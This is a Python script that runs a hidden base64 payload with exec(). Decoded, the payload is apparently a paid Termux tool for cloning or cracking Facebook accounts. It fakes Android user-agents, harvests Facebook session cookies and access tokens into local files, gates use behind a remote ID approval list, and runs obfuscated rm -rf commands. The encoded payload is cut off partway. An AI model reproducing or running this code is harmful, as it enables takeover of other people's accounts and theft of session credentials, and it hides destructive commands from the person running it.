import base64
exec(base64.b64decode("I0xFQUtFRCBCWSA6IFpBTQpmcm9tIG9zIGltcG9ydCBwYXRoCiMtLShEYXJrQENvbG91cnMpLS0tIwpyPSJcMDMzWzE7OTFtIgpnPSJcMDMzWzE7OTJtIgp5PSJcMDMzWzE7OTNtIgpiPSJcMDMzWzE7OTRtIgpwPSJcMDMzWzE7OTVtIgpjPSJcMDMzWzE7OTZtIgpsPSJcMDMzWzE7OTdtIgpzPSJcMDMzWzBtIgojLS0obGlnaHRAQ29sb3VycyktLS0jCmxyPSJcMDMzWzA7OTFtIgpsZz0iXDAzM1swOzkybSIKbHk9IlwwMzNbMDs5M20iCmxiPSJcMDMzWzA7OTRtIgpscD0iXDAzM1swOzk1bSIKbGM9IlwwMzNbMDs5Nm0iCmxsPSJcMDMzWzA7OTdtIgojLS0ocmFyZS1jb2xvcnMpLS0jCmhvbGFhPSIzODs1Igpybz0oZiJcMDMzW3tob2xhYX07MjA4IikKcmI9KGYiXDAzM1t7aG9sYWF9OzMyIikKcmM9KGYiXDAzM1t7aG9sYWF9OzEyMm0iKQpyZz0gKGYiXDAzM1t7aG9sYWF9OzExMm0iKQpycD0oZiJcMDMzW3tob2xhYX07MTQ3bSIpCmltcG9ydCBvcyxiYXNlNjQsemxpYixwaXAsdXJsbGliCnByaW50KCdcblwwMzNbMTszN20gQ2hlY2tpbmcgRm9yIFVwZGF0ZS4uLi4nKQogCnRyeToKICAgICAgICBpbXBvcnQgb3MscmVxdWVzdHMsanNvbix0aW1lLHJlLHJhbmRvbSxzeXMsdXVpZCxzdHJpbmcsc3VicHJvY2VzcwogICAgICAgIGZyb20gc3RyaW5nIGltcG9ydCAqCiAgICAgICAgZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRvciBhcyB0cmVkCmV4Y2VwdCBNb2R1bGVOb3RGb3VuZEVycm9yOgogICAgICAgIHByaW50KCdcbiBJbnN0YWxsaW5nIG1pc3NpbmcgbW9kdWxlcyAuLi4nKQogICAgICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgcmVxdWVzdHMgZnV0dXJlcz09MiA+IC9kZXYvbnVsbCcpCiAgICAgICAgb3Muc3lzdGVtKCdweXRob24gWkFNLnB5JykKZXhjZXB0OnBhc3MKICAgICAgICAKZmJrcz0oJ2NvbS5mYWNlYm9vay5hZHNtYW5hZ2VyJywnY29tLmZhY2Vib29rLmxpdGUnLCdjb20uZmFjZWJvb2sub3JjYScsJ2NvbS5mYWNlYm9vay5rYXRhbmEnLCdjb20uZmFjZWJvb2subWxpdGUnKQpndCA9IHJhbmRvbS5jaG9pY2UoWydHVC0xMDE1JywnR1QtMTAyMCcsJ0dULTEwMzAnLCdHVC0xMDM1JywnR1QtMTA0MCcsJ0dULTEwNDUnLCdHVC0xMDUwJywnR1QtMTI0MCcsJ0dULTE0NDAnLCdHVC0xNDUwJywnR1QtMTgxOTAnLCdHVC0xODI2MicsJ0dULTE5MDYwSScsJ0dULTE5MDgyJywnR1QtMTkwODMnLCdHVC0xOTEwNScsJ0dULTE5MTUyJywnR1QtMTkxOTInLCdHVC0xOTMwMCcsJ0dULTE5NTA1JywnR1QtMjAwMCcsJ0dULTIwMDAwJywnR1QtMjAwcycsJ0dULTMwMDAnLCdHVC00MTRYT1AnLCdHVC02OTE4JywnR1QtNzAxMCcsJ0dULTcwMjAnLCdHVC03MDMwJywnR1QtNzA0MCcsJ0dULTcwNTAnLCdHVC03MTAwJywnR1QtNzEwNScsJ0dULTcxMTAnLCdHVC03MjA1JywnR1QtNzIxMCcsJ0dULTcyNDBSJywnR1QtNzI0NScsJ0dULTczMDMnLCdHVC03MzEwJywnR1QtNzMyMCcsJ0dULTczMjUnLCdHVC03MzI2JywnR1QtNzM0MCcsJ0dULTc0MDUnLCdHVC03NTUwICAgNUdULTgwMDUnLCdHVC04MDEwJywnR1QtODEnLCdHVC04MTAnLCdHVC04MTA1JywnR1QtODExMCcsJ0dULTgyMjBTJywnR1QtODQxMCcsJ0dULTkzMDAnLCdHVC05MzIwJywnR1QtOTNHJywnR1QtQTcxMDAnLCdHVC1BOTUwMCcsJ0dULUFORFJPSUQnLCdHVC1CMjcxMCcsJ0dULUI1MzMwJywnR1QtQjUzMzBCJywnR1QtQjUzMzBMJywnR1QtQjUzMzBaS0FJTlUnLCdHVC1CNTUxMCcsJ0dULUI1NTEyJywnR1QtQjU3MjInLCdHVC1CNzUxMCcsJ0dULUI3NzIyJywnR1QtQjc4MTAnLCdHVC1COTE1MCcsJ0dULUI5Mzg4JywnR1QtQzMwMTAnLCdHVC1DMzI2MicsJ0dULUMzMzEwUicsJ0dULUMzMzEyJywnR1QtQzMzMTJSJywnR1QtQzMzMTNUJywnR1QtQzMzMjInLCdHVC1DMzMyMmknLCdHVC1DMzUyMCcsJ0dULUMzNTIwSScsJ0dULUMzNTkyJywnR1QtQzM1OTUnLCdHVC1DMzc4MicsJ0dULUM2NzEyJywnR1QtRTEyODJUJywnR1QtRTE1MDAnLCdHVC1FMjIwMCcsJ0dULUUyMjAyJywnR1QtRTIyNTAnLCdHVC1FMjI1MicsJ0dULUUyNjAwJywnR1QtRTI2NTJXJywnR1QtRTMyMTAnLCdHVC1FMzMwOScsJ0dULUUzMzA5SScsJ0dULUUzMzA5VCcsJ0dULUc1MzBIJywnR1QtZzkwMGYnLCdHVC1HOTMwRicsJ0dULUg5NTAwJywnR1QtSTU1MDgnLCdHVC1JNTgwMScsJ0dULUk2NDEwJywnR1QtSTgxNTAnLCdHVC1JODE2ME9LTFRQQScsJ0dULUk4MTYwWldMVFRUJywnR1QtSTgyNTgnLCdHVC1JODI2MkQnLCdHVC1JODI2OCcsJ0dULUk4NTA1JywnR1QtSTg1MzBCQUFCVFUnLCdHVC1JODUzMEJBTENITycsJ0dULUk4NTMwQkFMVFRUJywnR1QtSTg1NTBFJywnR1QtaTg3MDAnLCdHVC1JODc1MCcsJ0dULUk5MDAnLCdHVC1JOTAwOEwnLCdHVC1pOTA0MCcsJ0dULUk5MDgwRScsJ0dULUk5MDgyQycsJ0dULUk5MDgyRVdBSU5VJywnR1QtSTkwODJpJywnR1QtSTkxMDBHJywnR1QtSTkxMDBMS0xDSFQnLCdHVC1JOTEwME0nLCdHVC1JOTEwMFAnLCdHVC1JOTEwMFQnLCdHVC1JOTEwNVVBTkRCVCcsJ0dULUk5MTI4RScsJ0dULUk5MTI4SScsJ0dULUk5MTI4VicsJ0dULUk5MTU4UCcsJ0dULUk5MTU4VicsJ0dULUk5MTY4SScsJ0dULUk5MTkySScsJ0dULUk5MTk1SCcsJ0dULUk5MTk1TCcsJ0dULUk5MjUwJywnR1QtSTkzMDNJJywnR1QtSTkzMDVOJywnR1QtSTkzMDhJJywnR1QtSTk1MDVHJywnR1QtSTk1MDVYJywnR1QtSTk1MDdWJywnR1QtSTk2MDAnLCdHVC1tMTkwJywnR1QtTTU2NTAnLCdHVC1taW5pJywnR1QtTjUwMDBTJywnR1QtTjUxMDAnLCdHVC1ONTEwNScsJ0dULU41MTEwJywnR1QtTjUxMjAnLCdHVC1ONzAwMEInLCdHVC1ONzAwNScsJ0dULU43MTAwVCcsJ0dULU43MTAyJywnR1QtTjcxMDUnLCdHVC1ONzEwNVQnLCdHVC1ONzEwOCcsJ0dULU43MTA4RCcsJ0dULU44MDAwJywnR1QtTjgwMDUnLCdHVC1OODAxMCcsJ0dULU44MDIwJywnR1QtTjkwMDAnLCdHVC1OOTUwNScsJ0dULVAxMDAwQ1dBWFNBJywnR1QtUDEwMDBNJywnR1QtUDEwMDBUJywnR1QtUDEwMTAnLCdHVC1QMzEwMEInLCdHVC1QMzEwNScsJ0dULVAzMTA4JywnR1QtUDMxMTAnLCdHVC1QNTEwMCcsJ0dULVA1MjAwJywnR1QtUDUyMTBYRDEnLCdHVC1QNTIyMCcsJ0dULVA2MjAwJywnR1QtUDYyMDBMJywnR1QtUDYyMDEnLCdHVC1QNjIxMCcsJ0dULVA2MjExJywnR1QtUDY4MDAnLCdHVC1QNzEwMCcsJ0dULVA3MzAwJywnR1QtUDczMDBCJywnR1QtUDczMTAnLCdHVC1QNzMyMCcsJ0dULVA3NTAwRCcsJ0dULVA3NTAwTScsJ0dULVA3NTAwUicsJ0dULVA3NTAwVicsJ0dULVA3NTAxJywnR1QtUDc1MTEnLCdHVC1TMzMzMCcsJ0dULVMzMzMyJywnR1QtUzMzMzMnLCdHVC1TMzM3MCcsJ0dULVMzNTE4JywnR1QtUzM1NzAnLCdHVC1TMzYwMGknLCdHVC1TMzY1MCcsJ0dULVMzNjUzVycsJ0dULVMzNzcwSycsJ0dULVMzNzcwTScsJ0dULVMzODAwVycsJ0dULVMzODAyJywnR1QtUzM4NTAnLCdHVC1TNTIyMCcsJ0dULVM1MjIwUicsJ0dULVM1MjIyJywnR1QtUzUyMzAnLCdHVC1TNTIzMFcnLCdHVC1TNTIzM1QnLCdHVC1zNTIzM3cnLCdHVC1TNTI1MCcsJ0dULVM1MjUzJywnR1QtczUyNjAnLCdHVC1TNTI4MCcsJ0dULVM1MjgyJywnR1QtUzUyODNCJywnR1QtUzUyOTInLCdHVC1TNTMwMCcsJ0dULVM1MzAwTCcsJ0dULVM1MzAxJywnR1QtUzUzMDFCJywnR1QtUzUzMDFMJywnR1QtUzUzMDInLCdHVC1TNTMwMkInLCdHVC1TNTMwMycsJ0dULVM1MzAzQicsJ0dULVM1MzEwJywnR1QtUzUzMTBCJywnR1QtUzUzMTBDJywnR1QtUzUzMTBFJywnR1QtUzUzMTBHJywnR1QtUzUzMTBJJywnR1QtUzUzMTBMJywnR1QtUzUzMTBNJywnR1QtUzUzMTBOJywnR1QtUzUzMTInLCdHVC1TNTMxMkInLCdHVC1TNTMxMkMnLCdHVC1TNTMxMkwnLCdHVC1TNTMzMCcsJ0dULVM1MzYwJywnR1QtUzUzNjBCJywnR1QtUzUzNjBMJywnR1QtUzUzNjBUJywnR1QtUzUzNjMnLCdHVC1TNTM2NycsJ0dULVM1MzY5JywnR1QtUzUzODAnLCdHVC1TNTM4MEQnLCdHVC1TNTUwMCcsJ0dULVM1NTYwJywnR1QtUzU1NjBpJywnR1QtUzU1NzBCJywnR1QtUzU1NzBJJywnR1QtUzU1NzBMJywnR1QtUzU1NzgnLCdHVC1TNTYwMCcsJ0dULVM1NjAzJywnR1QtUzU2MTAnLCdHVC1TNTYxMEsnLCdHVC1TNTYxMScsJ0dULVM1NjIwJywnR1QtUzU2NzAnLCdHVC1TNTY3MEInLCdHVC1TNTY3MEhLQlpUQScsJ0dULVM1NjkwJywnR1QtUzU2OTBSJywnR1QtUzU4MzAnLCdHVC1TNTgzMEQnLCdHVC1TNTgzMEcnLCdHVC1TNTgzMGknLCdHVC1TNTgzMEwnLCdHVC1TNTgzME0nLCdHVC1TNTgzMFQnLCdHVC1TNTgzMFYnLCdHVC1TNTgzMWknLCdHVC1TNTgzOCcsJ0dULVM1ODM5aScsJ0dULVM2MDEwJywnR1QtUzYwMTBCQkFCVFUnLCdHVC1TNjAxMicsJ0dULVM2MDEyQicsJ0dULVM2MTAyJywnR1QtUzYxMDJCJywnR1QtUzYyOTNUJywnR1QtUzYzMTBCJywnR1QtUzYzMTBaV0FNSUQnLCdHVC1TNjMxMicsJ0dULVM2MzEzVCcsJ0dULVM2MzUyJywnR1QtUzY1MDAnLCdHVC1TNjUwMEQnLCdHVC1TNjUwMEwnLCdHVC1TNjc5MCcsJ0dULVM2NzkwTCcsJ0dULVM2NzkwTicsJ0dULVM2NzkyTCcsJ0dULVM2ODAwJywnR1QtUzY4MDBIS0FYRkEnLCdHVC1TNjgwMicsJ0dULVM2ODEwJywnR1QtUzY4MTBCJywnR1QtUzY4MTBFJywnR1QtUzY4MTBMJywnR1QtUzY4MTBNJywnR1QtUzY4MTBNQkFTRVInLCdHVC1TNjgxMFAnLCdHVC1TNjgxMicsJ0dULVM2ODEyQicsJ0dULVM2ODEyQycsJ0dULVM2ODEyaScsJ0dULVM2ODE4JywnR1QtUzY4MThWJywnR1QtUzcyMzBFJywnR1QtUzcyMzNFJywnR1QtUzcyNTBEJywnR1QtUzcyNjInLCdHVC1TNzI3MCcsJ0dULVM3MjcwTCcsJ0dULVM3MjcyJywnR1QtUzcyNzJDJywnR1QtUzcyNzNUJywnR1QtUzcyNzgnLCdHVC1TNzI3OFUnLCdHVC1TNzM5MCcsJ0dULVM3MzkwRycsJ0dULVM3MzkwTCcsJ0dULVM3MzkyJywnR1QtUzczOTJMJywnR1QtUzc1MDAnLCdHVC1TNzUwMEFCQUJUVScsJ0dULVM3NTAwQUJBREJUJywnR1QtUzc1MDBBQlRUTFAnLCdHVC1TNzUwMENXQURCVCcsJ0dULVM3NTAwTCcsJ0dULVM3NTAwVCcsJ0dULVM3NTYwJywnR1QtUzc1NjBNJywnR1QtUzc1NjInLCdHVC1TNzU2MkMnLCdHVC1TNzU2MmknLCdHVC1TNzU2MkwnLCdHVC1TNzU2NicsJ0dULVM3NTY4JywnR1QtUzc1NjhJJywnR1QtUzc1NzInLCdHVC1TNzU4MEUnLCdHVC1TNzU4M1QnLCdHVC1TNzU4WCcsJ0dULVM3NTkyJywnR1QtUzc3MTAnLCdHVC1TNzcxMEwnLCdHVC1TNzg5OCcsJ0dULVM3ODk4SScsJ0dULVM4NTAwJywnR1QtUzg1MzAnLCdHVC1TODYwMCcsJ0dULVNUQjkxOScsJ0dULVQxNDAnLCdHVC1UMTUwJywnR1QtVjhhJywnR1QtVjhpJywnR1QtVkM4MTgnLCdHVC1WTTkxOVMnLCdHVC1XMTMxJywnR1QtVzE1MycsJ0dULVg4MzEnLCdHVC1YODUzJywnR1QtWDg3MCcsJ0dULVg4OTAnLCdHVC1ZODc1MCddKQp1Z2VuPVtdCmZvciB4ZCBpbiByYW5nZSgxMDAwMCk6CiAgICAgICAgYWE9J01vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCcKICAgICAgICBiPXJhbmRvbS5jaG9pY2UoWyc2JywnNycsJzgnLCc5JywnMTAnLCcxMScsJzEyJywnMTMnXSkKICAgICAgICBjPWYnIFRMLXRsOyB7c3RyKGd0KX0nCiAgICAgICAgZz0nQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLycKICAgICAgICBoPXJhbmRvbS5yYW5kcmFuZ2UoNzMsMTAwKQogICAgICAgIGk9JzAnCiAgICAgICAgaj1yYW5kb20ucmFuZHJhbmdlKDQyMDAsNDkwMCkKICAgICAgICBrPXJhbmRvbS5yYW5kcmFuZ2UoNDAsMTUwKQogICAgICAgIGw9J01vYmlsZSBTYWZhcmkvNTM3LjM2JwogICAgICAgIHVha3UyPWYne2FhfSB7Yn07IHtjfSkge2d9e2h9LntpfS57an0ue2t9IHtsfScKICAgICAgICB1Z2VuLmFwcGVuZCh1YWt1MikKZm9yIGFnZW50IGluIHJhbmdlKDEwMDAwKToKICAgICAgICBhYT0nTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDYuMC4xOycKICAgICAgICBiPXJhbmRvbS5jaG9pY2UoWyc2JywnNycsJzgnLCc5JywnMTAnLCcxMScsJzEyJ10pCiAgICAgICAgYz0nZW4tdXM7IDEwOyBULU1vYmlsZSBteVRvdWNoIDNHIFNsaWRlIEJ1aWxkLycKICAgICAgICBkPXJhbmRvbS5jaG9pY2UoWydBJywnQicsICdDJywgJ0QnLCAnRScsICdGJywgJ0cnLCAnSCcsICdJJywgJ0onLCAnSycsICdMJywgJ00nLCAnTicsICdPJywgJ1AnLCAnUScsICdSJywgJ1MnLCAnVCcsICdVJywgJ1YnLCAnVycsICdYJywgJ1knLCAnWiddKQogICAgICAgIGU9cmFuZG9tLnJhbmRyYW5nZSgxLCA5OTkpCiAgICAgICAgZj1yYW5kb20uY2hvaWNlKFsnQScsJ0InLCAnQycsICdEJywgJ0UnLCAnRicsICdHJywgJ0gnLCAnSScsICdKJywgJ0snLCAnTCcsICdNJywgJ04nLCAnTycsICdQJywgJ1EnLCAnUicsICdTJywgJ1QnLCAnVScsICdWJywgJ1cnLCAnWCcsICdZJywgJ1onXSkKICAgICAgICBnPSdBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvODkuMC40Mzg5Ljk5JwogICAgICAgIGg9cmFuZG9tLnJhbmRyYW5nZSg3MywxMDApCiAgICAgICAgaT0nMCcKICAgICAgICBqPXJhbmRvbS5yYW5kcmFuZ2UoNDIwMCw0OTAwKQogICAgICAgIGs9cmFuZG9tLnJhbmRyYW5nZSg0MCwxNTApCiAgICAgICAgbD0nTW9iaWxlIFNhZmFyaS81MzMuMScKICAgICAgICBmdWxsYWdudD0oZid7YWF9IHtifTsge2N9e2R9e2V9e2Z9KSB7Z317aH0ue2l9LntqfS57a30ge2x9JykKICAgICAgICB1Z2VuLmFwcGVuZChmdWxsYWdudCkKbG9nbz0oIiIiCgpcMDMzWzk3OzFtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKXDAzM1sxOzM3bS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iIiIpCmRlZiBsaW5leCgpOgogICAgICAgIHByaW50KCdcMDMzWzE7MzdtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLScpCmRlZiBjbGVhcigpOgogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgIHByaW50KGxvZ28pCmxvb3A9MApva3M9W10KY3BzPVtdCnBjcD1bXQppZD1bXQp0b2tlbmt1PVtdCm1ldGhvZHMgPSBbXQpvaz1bXQp0b3RhbD1bXQpjbG9uZV90eXBlPVtdCmFuZHJvaWRfbW9kZWxzID0gW10KZGVmIGNoaygpOgogIHV1aWQgPSBzdHIob3MuZ2V0ZXVpZCgpKSArIHN0cihvcy5nZXRsb2dpbigpKSAKICBpZCA9ICJ8Ii5qb2luKHV1aWQpCiAgcHJpbnQoIlxuXG5ceDFiWzM3OzFtICBZT1VSIElEIDogXDAzM1szM20iK2lkKSAKICB0cnk6IAogICAgaHR0cENhaHQgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ2l0aHViLmNvbS9BUi1CUkFORC9BcHJvb3ZhbC50eHQvYmxvYi9tYWluL0Fwcm9vdmFsLnR4dCIpLnRleHQgCiAgICBpZiBpZCBpbiBodHRwQ2FodDogCiAgICAgIHByaW50KCJcMDMzWzkybSAgWU9VUiBJRCBJUyBBQ1RJVkUuIC4uLi4uLi5cMDMzWzk3bSIpIAogICAgICBtc2cgPSBzdHIob3MuZ2V0ZXVpZCgpKSAKICAgICAgdGltZS5zbGVlcCgxKSAKICAgICAgcGFzcyAKICAgIGVsc2U6IAogICAgICBwcmludCgiXDAzM1swOzk2bSBZT1VSIElEIElTIE5PVCBBQ1RJVkUgQ09QWfCfkYYgQU5EIFNFTkQgTUUgTUVTU0FHRSBPTiBXSEFUU0FQUCEiKQogICAgICBwcmludCgiXDAzM1swOzkxbSNOT1QgRlJFRSEhISIpIAogICAgICBvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vYXBpLndoYXRzYXBwLmNvbS9zZW5kP3Bob25lPSs5MjM0MTM5MzM3MzknKQogICAgICB0aW1lLnNsZWVwKDEpIAogICAgICBzeXMuZXhpdCgpIAogIGV4Y2VwdDogCiAgICBzeXMuZXhpdCgpIAogICAgaWYgbmFtZSA9PSAnX19tYWluX18nOiAKICAgICBwcmludCAobG9nbykKICAgICBjaGsoKSAKICAgIApjaGsoKQpvcy5zeXN0ZW0oInJtIC1yZiAuZjEiKQpvcy5zeXN0ZW0oInJtIC1yZiAuZjIiKQoKbG9nbz0gZicnJwog4paI4paI4paI4paI4paI4paI4paI4paI4paI4paI4paIICAg4paI4paI4paI4paI4paI4paI4paI4paI4paIICAg4paI4paI4paI4paI4paI4paIICAg4paI4paI4paI4paI4paI4paIIArilpHilojilpHilpHilpHilpHilpHilpHilojilojiloggICDilojilojilojilpHilpHilpHilpHilpHilojilojilogg4paR4paR4paI4paI4paI4paI4paI4paIIOKWiOKWiOKWiOKWiOKWiOKWiCAK4paRICAgICDilojilojilojilpEgICDilpHilojilojiloggICAg4paR4paI4paI4paIICDilpHilojilojilojilpHilojilojilojilojilojilpHilojilojiloggCiAgICAg4paI4paI4paIICAgICDilpHilojilojilojilojilojilojilojilojilojilojiloggIOKWkeKWiOKWiOKWiOKWkeKWkeKWiOKWiOKWiCDilpHilojilojiloggCiAgICDilojilojiloggICAgICDilpHilojilojilojilpHilpHilpHilpHilpHilojilojiloggIOKWkeKWiOKWiOKWiCDilpHilpHilpEgIOKWkeKWiOKWiOKWiCAKICDilojilojilojiloggICAgIOKWiCDilpHilojilojiloggICAg4paR4paI4paI4paIICDilpHilojilojiloggICAgICDilpHilojilojiloggCiDilojilojilojilojilojilojilojilojilojilojilogg4paI4paI4paI4paI4paIICAg4paI4paI4paI4paI4paIIOKWiOKWiOKWiOKWiOKWiCAgICAg4paI4paI4paI4paI4paICuKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWkSDilpHilpHilpHilpHilpEgICDilpHilpHilpHilpHilpEg4paR4paR4paR4paR4paRICAgICDilpHilpHilpHilpHilpEKezUwKiItIn0KXDAzM1szMW0gWyFdXDAzM1s5NzsxbVRPT0wgT1dFUiA6XDAzM1szM20gQVItQlJBTkQgICAgIApcMDMzWzMxbSBbIV1cMDMzWzk3OzFtVE9PTCBOQU1FIDpcMDMzWzMzbSBaQU0KXDAzM1szMW0gWyFdXDAzM1s5NzsxbVZFUlNJT04gICA6XDAzM1szM20gMC4wLjEKXDAzM1szMW0gWyFdXDAzM1s5NzsxbVRPT0xTICAgICA6XDAzM1szM20gUEFJRAp7NTAqIi0ifScnJwoKZGVmIHhjaGtlcigpOgogICAgcGFzcwpkZWYgbWFpbigpOgogICAgICAgIHhjaGtlcigpCiAgICAgICAgb3Muc3lzdGVtKCdybSAtcmYgLi4udHh0JykKICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgICAgICBwcmludChsb2dvKTt4Y2hrZXIoKQogICAgICAgIHByaW50KCdcMDMzWzk3OzFtWzFdIEZpbGUgQ3JlYXRlIE1lbnUnKQogICAgICAgIHByaW50KCdcMDMzWzk3OzFtWzJdIFJlbW92ZSBDb29raWUnKQogICAgICAgIHByaW50KCdcMDMzWzk3OzFtWzNdIENsZWFyIENhY2hlJykKICAgICAgICBwcmludCgnXDAzM1s5NzsxbVswXSBFeGl0JykKICAgICAgICBwcmludCg1MConLScpCiAgICAgICAgbWVudV9vcHQgPSBpbnB1dCgnU2VsZWN0IGNob2ljZSA6ICcpCiAgICAgICAgaWYgbWVudV9vcHQgPT0nMSc6CiAgICAgICAgICAgICAgICBjcmVhdGVfZmlsZSgpCiAgICAgICAgZWxpZiBtZW51X29wdCA9PScyJzoKICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgncm0gLXJmIGZiX2Nvb2tpZXMudHh0JykKICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgncm0gLXJmIGFjY2Vzc190b2tlbi50eHQnKQogICAgICAgICAgICAgICAgcHJpbnQoJyAgICAgICBSZW1vdmVkIFN1Y2Nlc3MnKQogICAgICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICAgICAgbWFpbigpCiAgICAgICAgZWxpZiBtZW51X29wdCA9PSczJzoKICAgICAgICAgICAgICAgIGlzZGQ9Imxlcy91IgogICAgICAgICAgICAgICAgaXNkPSJzci90IgogICAgICAgICAgICAgICAgaXNkZGQ9InAvLiIKICAgICAgICAgICAgICAgIGxsYiA9IGYiL2RhdGEvZGF0YS9jb20udGVybXV4L2Zpe2lzZGR9e2lzZH1te2lzZGRkfSoiCiAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oZiJybSAtcmYge2xsYn0iKQogICAgICAgICAgICAgICAgZXhpdCgiICAgICAgU3VjZXNzZnVsbHkgUmVtb3ZlZCAuICAgICAgIikKICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgb3Muc3lzdGVtKCdweXRob24gdXNlLnB5JykKICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICAgICAgZXhpdCgndmlkZW8gaXMgbm90IGF2YWxpYmxlIFJpZ2h0IG5vdyBpbiBzZXJ2ZXIgdHJ5IGFnYWluIGFmdGVyIGZldyBob3VycycpCiAgICAgICAgZWxpZiBtZW51X29wdCA9PSAiMCI6CiAgICAgICAgICAgICAgICBtYWluKCkKICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcHJpbnQoJ1xuIEludmFsaWQgb3B0aW9uLCB0cnkgYWdhaW4gLi4uJykKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgICAgIG1haW4oKQoKCmRlZiBsb2dpbigpOgogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgIHByaW50KGxvZ28pO3hjaGtlcigpCiAgICAgICAgY29va2llcyA9IGlucHV0KCcgUHV0IGNvb2tpZXMgaGVyZTogJykKICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBwcmludCgnXG4gVmFsaWRhdGluZyBjb29raWVzIC4uLiAnKQogICAgICAgICAgICAgICAgZGF0YSA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9idXNpbmVzcy5mYWNlYm9vay5jb20vYnVzaW5lc3NfbG9jYXRpb25zIiwgaGVhZGVycyA9IHsidXNlci1hZ2VudCI6ICJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNi4wLjE7IFJlZG1pIDRBIEJ1aWxkL01NQjI5TSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU5LjAuMzA3MS45MiBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsInJlZmVyZXIiOiAiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyIsImhvc3QiOiAiYnVzaW5lc3MuZmFjZWJvb2suY29tIiwib3JpZ2luIjogImh0dHBzOi8vYnVzaW5lc3MuZmFjZWJvb2suY29tIiwidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyIgOiAiMSIsImFjY2VwdC1sYW5ndWFnZSI6ICJpZC1JRCxpZDtxPTAuOSxlbi1VUztxPTAuOCxlbjtxPTAuNyIsImNhY2hlLWNvbnRyb2wiOiAibWF4LWFnZT0wIiwiYWNjZXB0IjoidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCpbaW5zZXJ0ZWQgYnkgY3l0aG9uIHRvIGF2b2lkIGNvbW1lbnQgY2xvc2VyXS9baW5zZXJ0ZWQgYnkgY3l0aG9uIHRvIGF2b2lkIGNvbW1lbnQgc3RhcnRdKjtxPTAuOCIsImNvbnRlbnQtdHlwZSI6InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCJ9LCBjb29raWVzID0geyJjb29raWUiOmNvb2tpZXN9KQogICAgICAgICAgICAgICAgZmluZF90b2tlbiA9IHJlLnNlYXJjaCgiKEVBQUdcdyspIiwgZGF0YS50ZXh0KQogICAgICAgICAgICAgICAgb3BlbigiYWNjZXNzX3Rva2VuLnR4dCIsICJ3Iikud3JpdGUoZmluZF90b2tlbi5ncm91cCgxKSkKICAgICAgICAgICAgICAgIG9wZW4oImZiX2Nvb2tpZXMudHh0IiwidyIpLndyaXRlKGNvb2tpZXMpCiAgICAgICAgICAgICAgICBwcmludCgnIExvZ2dlZCBpbiBzdWNjZXNzZnVsbHkgLi4uJykKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMSkKICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgncHl0aG9uIG1hbGFuZy5weScpCiAgICAgICAgZXhjZXB0IEtleUVycm9yOgogICAgICAgICAgICAgICAgcHJpbnQoJ1xuIEluYXZsaWQgY29va2llcywgdHJ5IGFub3RoZXIgY29va2llcycpCiAgICAgICAgICAgICAgICBleGl0KCkKICAgICAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6CiAgICAgICAgICAgICAgICBwcmludCgnXG4gTm8gaW50ZXJuZXQgY29ubmVjdGlvbiAuLi4nKQogICAgICAgICAgICAgICAgZXhpdCgpCiAgICAgICAgZXhjZXB0IEF0dHJpYnV0ZUVycm9yOgogICAgICAgICAgICAgICAgcHJpbnQoJ1xuIEludmFsaWQgY29va2llcywgdHJ5IGFub3RoZXIgY29va2llcyAuLi4nKQogICAgICAgICAgICAgICAgZXhpdCgpCmRlZiBjcmVhdGVfZmlsZSgpOgogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgIHByaW50KGxvZ28pO3hjaGtlcigpCiAgICAgICAgcHJpbnQoJ1wwMzNbOTc7MW0gWzFdIENyZWF0ZSBGaWxlICcpCiAgICAgICAgcHJpbnQoJ1wwMzNbOTc7MW0gWzJdIFJlbW92ZSBEb3VibGUgSWRzICcpCiAgICAgICAgcHJpbnQoJ1wwMzNbOTc7MW0gWzNdIFNlcHJhdGUgSWRzICcpCiAgICAgICAgcHJpbnQoJ1wwMzNbOTc7MW0gWzBdIEJhY2snKQogICAgICAgIHByaW50KDUwKictJykKICAgICAgICBjcmVhdGVfID0gaW5wdXQoJyBTZWxlY3Q